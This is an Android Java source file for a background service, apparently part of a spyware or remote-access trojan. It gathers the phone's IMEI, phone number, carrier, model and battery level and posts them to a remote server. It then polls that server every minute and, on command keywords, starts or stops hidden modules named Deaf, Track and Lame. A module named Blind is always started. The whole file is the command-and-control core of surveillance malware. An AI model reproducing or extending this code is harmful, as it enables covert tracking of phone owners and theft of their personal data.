package com.cripple;

/**
 * Created by Developer on 01.02.2018.
 */

import android.Manifest;
import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.os.StrictMode;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;

import com.glob.Constants;
import com.glob.Global;
import com.loopj.android.http.RequestParams;
import com.test.Blind;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class Runner extends Service {

    static Runner instance;
    public static String devImei = "";
    Timer timer = null;
    TimerTask timerTask;

    public Runner() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public void onCreate() {
        Global.printLn("Runner", "onCreate","");
        super.onCreate();
        instance = this;

        if (startService(new Intent(this, Temp.class)) == null)
            throw new RuntimeException("Couldn't find " + Temp.class.getSimpleName());

        try {
            //showNotification();
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
            getDeviceInfo();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        Global.printLn("Runner", "onStartCommand","");
        time();
        return Service.START_STICKY;
    }

    public void onDestroy() {
        Global.printLn("Runner", "onDestroy","");
        timer.cancel();
        stopForeground(true);
        stopSelf();
        super.onDestroy();
    }

    //----------------------------------------------------------------------------------------------
    public void getDeviceInfo() throws JSONException {
        //---------
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        //---------
        String serviceName = Context.TELEPHONY_SERVICE;
        String model = Build.MODEL;
        //---------
        TelephonyManager m_telephonyManager = (TelephonyManager)getSystemService(serviceName);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            devImei = m_telephonyManager.getImei();
        else
            devImei = m_telephonyManager.getDeviceId();
        String NetworkOperatorName = m_telephonyManager.getNetworkOperatorName();
        String phoneNum = m_telephonyManager.getLine1Number();
        //---------
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent battery = this.registerReceiver(null, ifilter);
        int level = battery.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = battery.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        float batteryPct = Math.round((level/(float)scale)*100);
        //---------

        JSONObject json = new JSONObject();
        json.put("p_dev_imei", devImei);
        json.put("p_dev_name", Build.MANUFACTURER);
        json.put("p_dev_model", model);
        json.put("p_soft_info", Build.VERSION.RELEASE);
        json.put("p_operator", NetworkOperatorName);
        json.put("p_line_number", phoneNum);
        json.put("p_charge_percent", batteryPct);
        Global.printLn("Runner","getDeviceInfo","json.toString()======="+json.toString());

        try {
            RequestParams params = new RequestParams();
            params.put("p_dev_inf_json", json.toString());
            Global.postUrl(Constants.GLOBALVAL.urlDevInfo, params);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    //----------------------------------------------------------------------------------------------
    public void listen() throws IOException, JSONException {
        Global.dirs();

        if (devImei.isEmpty() || devImei == null)
            getDeviceInfo();

        RequestParams params = new RequestParams();
        params.put("p_dev_id", devImei);
        Global.printLn("Runner", "listen","devImei ==== "+devImei);
        String responce = Global.postUrl(Constants.GLOBALVAL.urlServTrack, params);
        //-------------DEAF-------------------------------------------------------------------------
        if (responce.indexOf("deaf") > 0)
        {
            if (!horseRunning(Deaf.class))
                startService(new Intent(this, Deaf.class));
        }
        else
            stopService(new Intent(this, Deaf.class));

        //-------------TRACK------------------------------------------------------------------------
        if (responce.indexOf("track") > 0)
        {
            if (!horseRunning(Track.class)) {
                Intent startTrack = new Intent(this, Track.class);
                startService(startTrack);
            }
        }
        else
            stopService(new Intent(this, Track.class));

        //-------------LAME------------------------------------------------------------------------
        if (responce.indexOf("lame") > 0)
        {
            if (!horseRunning(Lame.class)) {
                Intent startLame = new Intent(this, Lame.class);
                startService(startLame);
            }
        }
        else
            stopService(new Intent(this, Lame.class));
        //-------------BLIND------------------------------------------------------------------------
        //if (responce.indexOf("blind") > 0)
        {
            if (!horseRunning(Blind.class)) {
                Intent startBlind = new Intent(this, Blind.class);
                startService(startBlind);
            }
        }
        //else
        //    stopService(new Intent(this, Blind.class));
    }

    //----------------------------------------------------------------------------------------------
    private void time() {
        timer = new Timer();
        timerTask = new TimerTask() {
            @Override
            public void run() {
                try {
                    listen();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        };
        timer.scheduleAtFixedRate(timerTask, 1000, 60000);
    }

    //----------------------------------------------------------------------------------------------
    private boolean horseRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }



}
